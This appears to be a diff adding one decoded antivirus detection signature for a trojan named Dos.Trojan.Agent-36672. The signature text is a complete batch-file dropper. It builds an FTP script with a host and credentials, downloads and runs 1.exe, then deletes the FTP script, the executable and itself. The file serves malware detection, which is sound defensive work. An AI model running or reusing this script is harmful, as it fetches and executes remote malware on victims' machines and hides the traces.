@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36672
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off ping 127.0.0.1 -n 300 @echo open www.188m.info>d:\down.ini @echo wangyunfei>>d:\down.ini @echo 619209>>d:\down.ini @echo get web/1.exe>>d:\down.ini @echo bye>>d:\down.ini @ftp -"s":d:\down.ini @1.exe @del d:\down.ini @del 1.exe @del %0 
